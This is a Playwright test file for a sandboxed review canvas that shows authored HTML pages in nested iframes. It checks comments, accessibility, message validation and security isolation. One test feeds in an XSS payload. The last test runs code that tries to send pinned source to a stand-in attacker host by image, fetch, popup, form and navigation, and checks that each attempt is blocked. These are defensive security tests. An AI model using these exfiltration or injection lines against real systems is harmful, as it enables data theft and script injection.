import { test, expect } from "@playwright/test";

test("HTML pages discover dynamic pinned slots, preserve JS state and submit host comments", async ({
  page,
}) => {
  await page.goto("/tests/e2e/review-canvas.html?tour=html-pages");
  const frame = page
    .frameLocator('iframe[title="Input trimming"]')
    .frameLocator("iframe");
  await expect(frame.locator("h1")).toHaveText("Trim then convert");
  await expect(
    frame.locator('refact-slot[data-block="code"] pre'),
  ).toContainText("Number(p.trim())");
  await frame.locator("#counter").click();
  await frame.locator("#dynamic").click();
  await expect(
    frame.locator('refact-slot[data-block="diff"] pre'),
  ).toContainText("@@");
  await frame.locator("#invalid").click();
  await expect(page.getByRole("dialog")).toHaveCount(0);
  await frame
    .locator('refact-slot[data-block="code"]')
    .getByRole("button", { name: "Comment", exact: true })
    .click();
  const dialog = page.getByRole("dialog");
  await dialog
    .getByRole("textbox", { name: "Question about this block" })
    .fill("Why normalize here?");
  await dialog.getByRole("button", { name: "Ask", exact: true }).click();
  await expect
    .poll(() => page.evaluate(() => window.__reviewFixture?.comments()))
    .toMatchObject([
      {
        target: {
          candidate_id: "c2",
          step_id: "step-1",
          version: 2,
          block_id: "code",
          block_revision: 1,
        },
        body: "Why normalize here?",
      },
    ]);
  await dialog.getByRole("button", { name: "Close", exact: true }).click();
  await expect(frame.locator("#counter")).toHaveText("1");
  await frame
    .locator('refact-slot[data-block="code"]')
    .getByRole("button", { name: "Reveal", exact: true })
    .click();
  await expect(
    page.getByRole("dialog").locator(".cm-editor").first(),
  ).toBeVisible();
  await expect
    .poll(() =>
      dialog.evaluate((element) =>
        element.contains(element.ownerDocument.activeElement),
      ),
    )
    .toBe(true);
  await page.keyboard.press("Escape");
  await expect(page.getByRole("dialog")).toHaveCount(0);
  await expect(frame.locator("#counter")).toHaveText("1");
});

test("reduced motion starts with short static fallback and live page is keyboard accessible", async ({
  page,
}) => {
  await page.emulateMedia({ reducedMotion: "reduce" });
  await page.goto("/tests/e2e/review-canvas.html?tour=html-pages");
  await expect(page.locator('iframe[title="Input trimming"]')).toHaveCount(0);
  await page
    .getByRole("button", { name: "Show live explanation" })
    .first()
    .focus();
  await page.keyboard.press("Enter");
  const frame = page
    .frameLocator('iframe[title="Input trimming"]')
    .frameLocator("iframe");
  await expect(frame.locator("html")).toHaveAttribute(
    "data-refact-reduced-motion",
    "true",
  );
  await frame.locator("#counter").focus();
  await page.keyboard.press("Enter");
  await expect(frame.locator("#counter")).toHaveText("1");
});

test("opaque frame accepts only registered IDs and flags duplicate slots", async ({
  page,
}) => {
  await page.goto("/tests/e2e/review-canvas.html?tour=html-pages");
  const iframe = page.locator('iframe[title="Input trimming"]');
  const frame = page
    .frameLocator('iframe[title="Input trimming"]')
    .frameLocator("iframe");
  await expect(
    frame.locator('refact-slot[data-block="code"] pre'),
  ).toContainText("Number(p.trim())");
  const src = await iframe.getAttribute("srcdoc");
  const channel = /var channel\s*=\s*("[^"]+")/.exec(src ?? "")?.[1];
  expect(channel).toBeTruthy();
  await page.evaluate(
    (encoded) =>
      window.postMessage(
        {
          type: "refact-review-block-action",
          channel: JSON.parse(encoded ?? '""'),
          action: "comment",
          id: "code",
        },
        "*",
      ),
    channel,
  );
  await expect(page.getByRole("dialog")).toHaveCount(0);
  const inner = page
    .frames()
    .find(
      (f) => f.url() === "about:srcdoc" && !!f.parentFrame()?.parentFrame(),
    );
  await inner?.evaluate(() => {
    document.body.insertAdjacentHTML(
      "beforeend",
      '<refact-slot data-block="unknown"></refact-slot><refact-slot data-block="code"></refact-slot>',
    );
  });
  await expect(
    frame.locator('refact-slot[data-block="unknown"]'),
  ).toContainText("unavailable");
  await expect(
    frame.locator('refact-slot[data-block="code"]').last(),
  ).toContainText("duplicate");
  expect(await iframe.getAttribute("sandbox")).toBe("allow-scripts");
});

test("host-fed source bytes remain inert DOM text", async ({ page }) => {
  await page.goto("/tests/e2e/review-canvas.html?tour=html-pages");
  const iframe = page.locator('iframe[title="Input trimming"]');
  const frame = page
    .frameLocator('iframe[title="Input trimming"]')
    .frameLocator("iframe");
  await expect(
    frame.locator('refact-slot[data-block="code"] pre'),
  ).toContainText("Number(p.trim())");
  const src = await iframe.getAttribute("srcdoc");
  const channel = JSON.parse(
    /var channel\s*=\s*("[^"]+")/.exec(src ?? "")?.[1] ?? '""',
  ) as string;
  const text = '\t</script><img src=x onerror="window.xss=true">\r';
  await page.evaluate(
    ({ channel, text }) => {
      const el = document.querySelector<HTMLIFrameElement>(
        'iframe[title="Input trimming"]',
      );
      el?.contentWindow?.postMessage(
        {
          type: "refact-review-page-data",
          channel,
          previews: [
            { id: "code", title: "Pinned code", text, available: true },
          ],
        },
        "*",
      );
    },
    { channel, text },
  );
  await expect(frame.locator('refact-slot[data-block="code"] pre')).toHaveText(
    text,
  );
  await expect(frame.locator("refact-slot img")).toHaveCount(0);
});

test("applying a different page version creates a fresh context, host refresh alone does not", async ({
  page,
}) => {
  await page.goto("/tests/e2e/review-canvas.html?tour=html-pages");
  const first = page
    .frameLocator('iframe[title="Input trimming"]')
    .frameLocator("iframe");
  await first.locator("#counter").click();
  await page.evaluate(() => window.__reviewFixture?.updateTopic());
  await expect(first.locator("#counter")).toHaveText("1");
  await page.getByRole("button", { name: "Apply updated topic · v3" }).click();
  const next = page
    .frameLocator('iframe[title="Updated input trimming"]')
    .frameLocator("iframe");
  await expect(next.locator("#counter")).toHaveText("0");
  await expect(
    next.locator('refact-slot[data-block="code"] pre'),
  ).toContainText("Number(p.trim())");
  await expect(
    page
      .frameLocator('iframe[title="Loop bound fix"]')
      .frameLocator("iframe")
      .locator("h1"),
  ).toHaveText("Bounds matter");
});

test("authored self-navigation cannot exfiltrate pinned source outside trusted wrapper", async ({
  page,
}) => {
  let requests = 0;
  await page.route("https://review-attacker.invalid/**", (route) => {
    requests++;
    return route.abort();
  });
  await page.goto("/tests/e2e/review-canvas.html?tour=html-pages");
  const frame = page
    .frameLocator('iframe[title="Input trimming"]')
    .frameLocator("iframe");
  await expect(
    frame.locator('refact-slot[data-block="code"] pre'),
  ).toContainText("Number(p.trim())");
  const inner = page
    .frames()
    .find(
      (f) => f.url() === "about:srcdoc" && !!f.parentFrame()?.parentFrame(),
    );
  expect(inner).toBeDefined();
  if (!inner) throw new Error("Authored frame missing");
  await inner.evaluate(async () => {
    const source = document.querySelector("refact-slot pre")?.textContent ?? "";
    const image = document.createElement("img");
    image.src =
      "https://review-attacker.invalid/image?source=" +
      encodeURIComponent(source);
    document.body.append(image);
    await fetch(
      "https://review-attacker.invalid/fetch?source=" +
        encodeURIComponent(source),
    ).catch(() => undefined);
    window.open(
      "https://review-attacker.invalid/popup?source=" +
        encodeURIComponent(source),
    );
    const form = document.createElement("form");
    form.action = "https://review-attacker.invalid/form";
    document.body.append(form);
    form.submit();
    location.href =
      "https://review-attacker.invalid/leak?source=" +
      encodeURIComponent(source);
  });
  await expect.poll(() => inner?.url()).not.toBe("about:srcdoc");
  expect(requests).toBe(0);
});
